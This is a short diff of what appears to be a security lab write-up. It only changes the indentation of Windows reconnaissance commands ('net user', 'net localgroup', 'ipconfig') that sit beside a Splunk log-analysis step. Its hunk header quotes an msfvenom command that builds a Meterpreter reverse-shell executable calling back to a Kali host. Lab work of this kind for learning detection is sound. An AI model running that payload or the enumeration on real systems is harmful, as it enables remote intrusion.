@@ -44,11 +44,11 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe > 
 
 5. Executed reconnaissance commands:
 
-  net user
+        net user
 
-  net localgroup
+        net localgroup
 
-  ipconfig
+        ipconfig
 
 6. Used Splunk to analyze logs and monitor process behavior and network activity.
 
